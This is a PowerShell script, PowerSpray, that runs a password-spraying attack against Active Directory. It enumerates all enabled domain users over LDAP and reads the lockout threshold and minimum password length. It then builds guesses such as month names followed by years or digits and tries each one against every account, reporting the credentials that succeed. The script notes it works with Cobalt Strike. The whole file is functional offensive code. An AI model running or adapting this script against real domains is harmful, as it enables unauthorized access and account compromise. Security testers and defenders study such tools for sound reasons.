function PowerSpray {
    <#

    .SYNOPSIS

        PowerSpray.ps1 Function: PowerSpray
        Author: John Cartrett (@jnqpblc)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This module is a simple script to perform a password spraying attack against all users of a domain and is compatible with Cobaltstrike.
        By default it will automatically generate the UserList from the domain.
        By default it will automatically generate the PasswordList using the current date.
        Be careful not to lockout any accounts.
    
    .LINK

        https://github.com/tallmega/PowerSpray
        https://serverfault.com/questions/276098/check-if-user-password-input-is-valid-in-powershell-script
        https://social.technet.microsoft.com/wiki/contents/articles/4231.working-with-active-directory-using-powershell-adsi-adapter.aspx
        https://blog.fox-it.com/2017/11/28/further-abusing-the-badpwdcount-attribute/
        
    .PARAMETER PasswordList

        A comma-separated list of passwords to use instead of the default list.

    .PARAMETER Delay

        The delay time between guesses in millisecounds.

    .PARAMETER Sleep
    
        The number of minutes to sleep between password cycles.

    .EXAMPLE

        PowerSpray
        PowerSpray -Delay 1000 -Sleep 10
        PowerSpray -PasswordList "Password1,Password2,Password1!,Password2!"
      
    #> 

    param (
    	[parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to use instead of the default list.")]
	[string]$PasswordList,
	[parameter(Mandatory=$false, HelpMessage="The delay time between guesses in millisecounds.")]
	[int]$Delay,
	[parameter(Mandatory=$false, HelpMessage="The number of minutes to sleep between password cycles.")]
	[int]$Sleep
    )

    $objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PDCRoleOwner)";
    $Searcher = New-Object DirectoryServices.DirectorySearcher;
    $Searcher.Filter = '(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';
    $Searcher.PageSize = 1000;
    $Searcher.PropertiesToLoad.Add("sAMAccountName") > $Null
    $Searcher.SearchRoot = $objPDC;
    $UserList = $Searcher.FindAll().Properties.samaccountname

    if (([string]::IsNullOrEmpty($UserList))) {
        Write-Host "[-] Failed to retrieve the usernames from Active Directory; the script will exit."
        exit
    } else {
        $UserCount = ($UserList).Count
        Write-Host "[+] Successfully collected $UserCount usernames from Active Directory."
	$lockoutThreshold = [int]$objPDC.lockoutThreshold.Value
        Write-Host "[*] The Lockout Threshold for the current domain is $($lockoutThreshold)."
	$minPwdLength = [int]$objPDC.minPwdLength.Value
        Write-Host "[*] The Min Password Length for the current domain is $($minPwdLength)."
    }

    if ($PSBoundParameters.ContainsKey('PasswordList')) {
        $PasswordList = -split $PasswordList
    } else {
        $PasswordList = @()
        $MonthList = @((Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month-1), (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month), (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month+1))
        $AppendList = @("18", "19", "18!", "19!", "2018", "2019", "2018!", "2019!", "1", "2", "3", "1!", "2!", "3!", "123", "1234", "123!", "1234!")
        foreach ($Month in $MonthList)
        {
            foreach ($Item in $AppendList)
            { 
                $Candidate = $Month + $Item
                if ($Candidate.length -ge $minPwdLength) {
                    $PasswordList += $Candidate
                }
            }
        }
	Write-Host "[+] Successfully generated a list of $($PasswordList.Count) passwords."
    }

    Write-Host "[*] Starting password spraying operations."
    foreach ($Password in $PasswordList)
    {
        Write-Host "[*] Using password $Password"
        foreach ($UserName in $UserList)
        {
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName;
            if (([string]::IsNullOrEmpty($CurrentDomain)))
            {
                Write-Host "[-] Failed to retrieve the domain name; the script will exit."
                exit
            }

            $Domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $UserName, $Password)

            if ($Domain.Name -eq $null)
            {
                # Write-Host "[-] Authentication failed with $UserName::$Password"
            } else {
                Write-Host "[+] Successfully authenticated with $UserName::$Password"
            }
            
            if ($PSBoundParameters.ContainsKey('Delay')) {
                Start-Sleep -Milliseconds $Delay
            } else {
                Start-Sleep -Milliseconds 1000
            }
        }
        Write-Host "[*] Completed all rounds with password $Password"
        
        if ($PSBoundParameters.ContainsKey('Sleep')) {
            $Duration = (New-Timespan -Minutes $Sleep).TotalSeconds
            Write-Host "[*] Now the script will sleep for $Duration seconds."
            Start-Sleep -Seconds $Duration
        }
    }
    Write-Host "[*] Completed all password spraying operations."
}
